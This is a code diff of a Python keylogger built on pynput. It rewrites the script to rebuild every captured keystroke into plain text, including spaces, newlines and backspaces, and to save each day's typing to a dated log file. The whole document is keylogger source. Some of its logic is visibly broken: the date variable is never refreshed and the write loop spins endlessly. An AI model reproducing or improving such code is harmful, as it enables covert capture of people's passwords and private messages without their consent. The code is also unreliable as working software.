@@ -1,14 +1,13 @@
 from threading import Thread
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
 from datetime import datetime, timedelta
 from pathlib import Path
 
 current_date = datetime.now()
 previous_date = datetime.now()
-keys_fo_the_day = []
-keys_previous_day = []
-days_run = 0
-countid = 0
+word = ''
+Full_day_list = ''
+
 
 
 def create_new_text():
@@ -20,26 +19,37 @@ def create_new_text():
                 file.close()
 
 def writeloop():
-    global countid
-    global days_run
+    global current_date
     global previous_date
-    def write_keys(list):
-        with open('log{}.txt'.format(previous_date.date()), 'w') as logfile:
-            for key in keys_previous_day:
-                key = str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n").replace("Key.backspace","\b")
-                logfile.write(str(key))
+    global word
+    global Full_day_list
     while True:
-        if current_date.date() == previous_date.date() + timedelta(days=1):
-            days_run +=1
-            if countid != days_run:
-                keys_previous_day = keys_fo_the_day.copy()
-                write_keys(keys_previous_day)
-                keys_fo_the_day.clear()
-                previous_date = datetime.now()
-                countid += 1
+        if current_date.date() > previous_date.date() + timedelta(days=1):
+            Full_day_list = word
+            word = ''
+            print(Full_day_list)
+            with open('log{}.txt'.format(previous_date.date()), 'w') as file:
+                file.write(Full_day_list)
+                file.close()
+            previous_date = datetime.now()
+
+
 
 def keypress(key):
-    keys_fo_the_day.append(key)
+    global word
+    if key == Key.space:
+        word += ' '
+    elif key == Key.enter:
+        word += '\n'
+    elif key == Key.backspace:
+        word = word[:-1]
+    elif key == Key.shift_l or key == Key.shift_r:
+        return
+    else:
+        char = str(key)
+        char = char[1]
+        word += char
+        print(word)
 
 
 X = Listener(on_press=keypress)
